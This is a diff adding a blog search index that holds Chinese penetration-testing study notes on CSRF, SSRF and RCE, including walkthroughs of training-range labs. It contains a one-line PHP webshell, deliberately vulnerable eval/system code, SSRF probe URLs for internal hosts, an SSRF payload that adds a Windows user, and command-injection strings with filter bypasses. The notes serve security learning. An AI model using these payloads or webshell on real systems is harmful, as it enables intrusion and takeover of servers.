@@ -1,0 +1,1223 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>CSRF及SSRF</title>
+    <url>/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/</url>
+    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote>
+<p>跨站脚本请求</p>
+<p>Cross-Site Request Forgery</p>
+</blockquote>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF.png" alt="CSRF"></p>
+<p>攻击者在自己的服务器上构造了攻击代码（比如知道添加管理员的数据包），受害者（管理员）用自己的身份权限在自己的浏览器去访问攻击链接</p>
+<span id="more"></span>
+
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>利用burp抓包，并且发送至<code>Generate CSRF PoC</code>这个插件</p>
+<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-1.png" alt="CSRF检测-1"></p>
+<p>在这个页面修改信息，并生成攻击代码</p>
+<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-2.png" alt="CSRF检测-2"></p>
+<p>copy攻击代码后，将其放在自己的服务器上</p>
+<p>然后用受害者身份在受害者的环境去访问，若信息修改成功，则存在CSRF</p>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106097698">Pikachu靶场</a></p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.当用户发送重要的请求时需要输入原始密码</p>
+<p>2.设置随机<code>token</code>，检测数据报的唯一性（最有效）</p>
+<p>3.校验<code>Referer</code>来源，请求时判断请求链接是否是当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</p>
+<p>4.设置验证码</p>
+<p>5.限制请求方式只能为POST</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote>
+<p>服务器请求伪造</p>
+<p>Server-Side Request Forgery</p>
+</blockquote>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9B%BE%E8%A7%A3.png" alt="SSRF图解"></p>
+<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等</p>
+<p>相当于是可以将存在SSRF的服务器<strong>作为一个代理</strong>，去访问其内网服务端的资源</p>
+<p>利用SSRF能实现以下效果:<br>1.扫描内网（主机信息收集，Web应用指纹识别）<br>2.根据所识别应用发送构造的Payload进行攻击<br>3.Denial of service（拒绝服务DOS）</p>
+<h3 id="各个协议调用探针"><a href="#各个协议调用探针" class="headerlink" title="各个协议调用探针"></a>各个协议调用探针</h3><p>http</p>
+<p>file</p>
+<p>dict</p>
+<p>ftp</p>
+<p>gopher</p>
+<h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>端口扫描、指纹识别、漏洞利用、内网探针</p>
+<p><a href="http://192.168.xx.xx/phpmyadmin">http://192.168.xx.xx/phpmyadmin</a></p>
+<p>file:///D:/<a href="http://www.txt/">www.txt</a></p>
+<p>dict://192.168.xx.xx:3306/info</p>
+<p><a href="ftp://192.168.xx.xx/">ftp://192.168.xx.xx:21</a></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    请输入图片地址：&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;url&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*内网的某台主机村子啊HFS漏洞,这里是通过存在SSRF的服务器对其内网主机进行利用</span></span><br><span class="line"><span class="comment">url=$_POST[&#x27;url&#x27;];</span></span><br><span class="line"><span class="comment">$img = file_get_contents(&#x27;http://192.168.xx.xx:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.&#125;&#x27;);</span></span><br><span class="line"><span class="comment">echo $url;</span></span><br><span class="line"><span class="comment">echo $img;</span></span><br><span class="line"><span class="comment">//header(&quot;Content-Type: img/jpeg;text/html; charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">//echo $img;</span></span><br><span class="line"><span class="comment">//$file = fopen(&#x27;x,png, &#x27;w+&#x27;);</span></span><br><span class="line"><span class="comment">//fwrite($file, $img);</span></span><br><span class="line"><span class="comment">//fclose($file);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;URL&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.png" alt="SSRF漏洞挖掘"></p>
+<h3 id="SSRF在各个编程语言中可以使用的协议"><a href="#SSRF在各个编程语言中可以使用的协议" class="headerlink" title="SSRF在各个编程语言中可以使用的协议"></a>SSRF在各个编程语言中可以使用的协议</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9C%A8%E5%90%84%E4%B8%AA%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE.png" alt="SSRF在各个编程语言中可以使用的协议"></p>
+<h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p>地址：<a href="https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top">https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top</a></p>
+<p>当输入<code>http://127.0.0.1</code>与直接输入<code>127.0.0.1</code>返回结果有差异，表明可能存在SSRF漏洞</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://pan.baidu.com/s/1bp96ECJ">CSRFTester-1.0</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+<p><a href="https://blog.csdn.net/Android_wxf/article/details/118582585">CSDN-看我一招征服SSRF</a></p>
+<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&spm_id_from=pageDriver">【小迪安全】WEB漏洞-CSRF及SSRF</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>CSRF</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE</title>
+    <url>/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<blockquote>
+<p>Remote Command/Code Execution</p>
+</blockquote>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/RCE.png" alt="RCE"></p>
+<span id="more"></span>
+
+<h2 id="漏洞形成条件"><a href="#漏洞形成条件" class="headerlink" title="漏洞形成条件"></a>漏洞形成条件</h2><p>存在可控变量</p>
+<p>存在可利用的漏洞函数</p>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%94%E7%A4%BA.png" alt="代码执行演示"></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">system(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%94%E7%A4%BA.png" alt="命令执行演示"></p>
+<h2 id="RCE漏洞产生相关函数"><a href="#RCE漏洞产生相关函数" class="headerlink" title="RCE漏洞产生相关函数"></a>RCE漏洞产生相关函数</h2><h3 id="PHP代码执行函数："><a href="#PHP代码执行函数：" class="headerlink" title="PHP代码执行函数："></a>PHP代码执行函数：</h3><ol>
+<li><code>eval()//把字符串作为PHP代码执行</code></li>
+<li><code>assert()//检查一个断言是否为 FALSE，可用来执行代码</code></li>
+<li><code>preg_replace()//执行一个正则表达式的搜索和替换</code></li>
+<li><code>call_user_func()//把第一个参数作为回调函数调用</code></li>
+<li><code>call_user_func_array()//调用回调函数，并把一个数组参数作为回调函数的参数</code></li>
+<li><code>array_map()//为数组的每个元素应用回调函数</code></li>
+</ol>
+<h3 id="PHP命令执行函数："><a href="#PHP命令执行函数：" class="headerlink" title="PHP命令执行函数："></a>PHP命令执行函数：</h3><ol>
+<li><code>system()//执行外部程序，并且显示输出</code></li>
+<li><code>exec()//执行一个外部程序</code></li>
+<li><code>shell_exec()//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</code></li>
+<li><code>passthru()//执行外部程序并且显示原始输出</code></li>
+<li><code>pcntl_exec()//在当前进程空间执行指定程序</code></li>
+<li><code>popen()//打开进程文件指针</code></li>
+<li><code>proc_open()//执行一个命令，并且打开用来输入/输出的文件指针</code></li>
+</ol>
+<h3 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h3><p>java.lang.Runtime.getRuntime(.exec(command)</p>
+<h3 id="Java代码执行"><a href="#Java代码执行" class="headerlink" title="Java代码执行"></a>Java代码执行</h3><p>Java中没有类似php中eval 函数这种直接可以将字符串转化为代码执行的函数，</p>
+<p>但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。</p>
+<h3 id="python代码执行"><a href="#python代码执行" class="headerlink" title="python代码执行"></a>python代码执行</h3><ol>
+<li><code>exec(string)# Python代码的动态执行</code></li>
+<li><code>eval(string)# 返回表达式或代码对象的值</code></li>
+<li><code>execfile(string)# 从一个文件中读取和执行Python脚本</code></li>
+<li><code>input(string)#Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入</code></li>
+<li><code>compile(string)# 将源字符串编译为可执行对象</code></li>
+</ol>
+<h3 id="python命令执行"><a href="#python命令执行" class="headerlink" title="python命令执行"></a>python命令执行</h3><ol>
+<li><code>system()#执行系统指令</code></li>
+<li><code>popen()#popen()方法用于从一个命令打开一个管道</code></li>
+<li><code>subprocess.call #执行由参数提供的命令</code></li>
+<li><code>spawn #执行命令</code></li>
+</ol>
+<h2 id="一句话WebShell后门原理代码执行"><a href="#一句话WebShell后门原理代码执行" class="headerlink" title="一句话WebShell后门原理代码执行"></a>一句话WebShell后门原理代码执行</h2><p>PHP一句话</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//cmd为密码</span></span><br><span class="line"><span class="comment">//@是可以屏蔽函数执行过程中遇到问题而产生的一些错误、警告信息，这样用户就看不到程序的出错信息。这样除了用户界面会友好一些外，更重要的是安全性，因为屏蔽了出错文件的路径等信息。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>caidao原理：将写好的功能数据包，在图形化界面通过一句话木马去触发</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="黑盒功能点命令执行-应用功能"><a href="#黑盒功能点命令执行-应用功能" class="headerlink" title="黑盒功能点命令执行-应用功能"></a>黑盒功能点命令执行-<em>应用功能</em></h3><p>地址：<a href="https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe">墨者学院-命令注入执行分析 </a></p>
+<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>访问靶场所给地址</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp1.png" alt="黑盒功能点命令执行-wp1"></p>
+<p><code>ping 127.0.0.1</code>结果</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp2.png" alt="黑盒功能点命令执行-wp2"></p>
+<p>用管道符<code>|</code>去执行其他命令<code>ping 127.0.0.1|ls</code>，有弹窗报错</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp4.png" alt="黑盒功能点命令执行-wp4"></p>
+<p>继续上一步操作，多了一个关闭提示框的选项，猜测这里进行了IP格式的前端验证</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp5.png" alt="黑盒功能点命令执行-wp5"></p>
+<p>右键查看源码果然有js的验证</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp6.png" alt="黑盒功能点命令执行-wp6"></p>
+<p>用burpsuite抓包就可以要过前端验证</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp7.png" alt="黑盒功能点命令执行-wp7"></p>
+<p><code>ls</code>命令查看当前目录文件，找到key</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp8.png" alt="黑盒功能点命令执行-wp8"></p>
+<p>直接<code>cat&lt;key_148351137230146.php</code>没有回显，应该是过滤了空格</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp9.png" alt="黑盒功能点命令执行-wp9"></p>
+<p>过滤了空格。我们需要将空格用其他字符替代一下，这里有两种方法<code>&lt;</code>和<code>$&#123;IFS&#125;</code></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp10.png" alt="黑盒功能点命令执行-wp10"></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp11.png" alt="黑盒功能点命令执行-wp11"></p>
+<p>另外还有两个点</p>
+<p>一是读文件还可以用<code>tac</code></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp12.png" alt="黑盒功能点命令执行-wp12"></p>
+<p>另一个是除了用管道符，还可以用<code>;</code>(分号)</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp13.png" alt="黑盒功能点命令执行-wp13"></p>
+<h3 id="白盒代码及命令执行-代码分析"><a href="#白盒代码及命令执行-代码分析" class="headerlink" title="白盒代码及命令执行-代码分析"></a>白盒代码及命令执行-<em>代码分析</em></h3><p>地址：<a href="https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe">墨者学院-PHP代码分析溯源(第4题)</a></p>
+<h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><p>访问把场所给地址</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp1.png" alt="白盒代码及命令执行-wp1"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode(&amp;<span class="number">40</span>pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//分析这里面是一段加密内容40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==</span></span><br></pre></td></tr></table></figure>
+
+<p>将源代码放在本地做功能测试</p>
+<p>注意要把首尾的&amp;替换成””，并用echo输出，得到加密内容</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp2.png" alt="白盒代码及命令执行-wp2"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里的考点</span></span><br><span class="line"><span class="keyword">echo</span> `cmd`</span><br><span class="line"><span class="comment">//cmd处为执行的命令</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是通过<code>$_REQUEST</code>传参，可以接收cookie，get，post的值</p>
+<p>我们这里采用get传参</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp3.png" alt="白盒代码及命令执行-wp3"></p>
+<p><code>cat&lt;key</code></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp4.png" alt="白盒代码及命令执行-wp4"></p>
+<p>右键查看源码，得到key值</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp5.png" alt="白盒代码及命令执行-wp5"></p>
+<h4 id="echo-测试"><a href="#echo-测试" class="headerlink" title="echo ``测试"></a>echo ``测试</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//eval(gzinflate(base64_decode(&quot;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;)));</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo `<span class="subst">$a</span>`;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Windows和Linux下均能执行系统命令</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="黑盒层RCE漏洞检测-公开漏洞"><a href="#黑盒层RCE漏洞检测-公开漏洞" class="headerlink" title="黑盒层RCE漏洞检测-公开漏洞"></a>黑盒层RCE漏洞检测-<em>公开漏洞</em></h3><p>地址：<a href="https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe">墨者学院-Webmin未经身份验证的远程代码执行</a></p>
+<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>访问把场所给地址</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp1.png" alt="黑盒层RCE漏洞检测-wp1"></p>
+<p>随便输入登录信息</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp2.png" alt="黑盒层RCE漏洞检测-wp2"></p>
+<p>Google搜索公开的exp，找到复现文章，利用burp抓包，放到Repeater里，根据搜索的文章改参数</p>
+<p>修改POST的路径和值</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp3.png" alt="黑盒层RCE漏洞检测-wp3"></p>
+<p>根据题目说key在根目录下，于是利用<code>ls /</code>，将改过的数据包发送，找到key </p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp4.png" alt="黑盒层RCE漏洞检测-wp4"></p>
+<p>再用<code>cat&lt;/key.txt</code>即可，注意是<code>/</code>目录下</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp5.png" alt="黑盒层RCE漏洞检测-wp5"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/LRedAnt/article/details/103701507">https://blog.csdn.net/LRedAnt/article/details/103701507</a></p>
+<p><a href="https://xz.aliyun.com/t/6040">https://xz.aliyun.com/t/6040</a></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/ermei/p/6689005.html">JAVA web网站代码审计－－入门</a></p>
+<p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">PHP 远程代码执行漏洞复现（CVE-2019-11043）</a></p>
+<p><a href="https://www.freebuf.com/articles/web/262005.html">远程命令与代码执行总结</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件下载读取</title>
+    <url>/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/</url>
+    <content><![CDATA[<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8.png" alt="文件操作安全"></p>
